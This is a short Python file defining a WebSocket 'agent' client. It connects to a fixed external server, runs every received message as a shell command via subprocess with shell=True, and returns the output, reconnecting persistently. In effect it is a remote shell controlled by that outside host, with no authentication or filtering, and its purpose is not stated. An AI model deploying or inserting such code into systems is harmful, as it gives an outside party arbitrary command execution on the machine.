import asyncio
import websockets
import subprocess

SERVER_URL = "wss://projectalphaapi.koushik.us/api/v1/ws"

class WebSocketClient:
    def __init__(self, agent_id):
        self.agent_id = agent_id
        self.websocket_url = f"{SERVER_URL}/{self.agent_id}"
        self.connected = False

    async def handle_command(self, command):
        try:
            print(f"Executing command: {command}")
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode()}"

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.websocket_url) as websocket:
                    print(f"Connected to WebSocket server at {self.websocket_url}")
                    self.connected = True
                    while True:
                        try:
                            command = await websocket.recv()
                            print(f"Received command: {command}")
                            result = await self.handle_command(command)
                            print(f"Sending result: {result}")
                            await websocket.send(result)
                        except websockets.ConnectionClosed:
                            print("Connection closed. Reconnecting...")
                            self.connected = False
                            break
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 5 seconds...")
                self.connected = False
                await asyncio.sleep(5)

    async def test_connection(self):
        try:
            async with websockets.connect(self.websocket_url) as websocket:
                print(f"Successfully connected to {self.websocket_url}")
                return True
        except Exception as e:
            print(f"Failed to connect to WebSocket: {e}")
            return False

if __name__ == "__main__":
    # Example test for standalone execution
    client = WebSocketClient("agent-id-placeholder")
    asyncio.run(client.test_connection())
